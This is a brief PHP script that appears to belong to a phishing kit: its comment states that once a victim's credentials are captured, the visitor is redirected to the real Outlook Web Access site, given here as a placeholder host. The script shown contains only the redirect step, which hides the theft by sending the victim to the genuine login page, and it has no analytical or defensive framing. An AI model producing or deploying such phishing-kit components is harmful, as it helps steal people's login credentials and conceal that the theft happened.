
<?php
  
   $redirect_to = "https://__target_real_owa__";
   
  // after credentials are captured, redirect to '$redirect_to'
  header( "Location: " . $redirect_to ) ;
  exit();
?>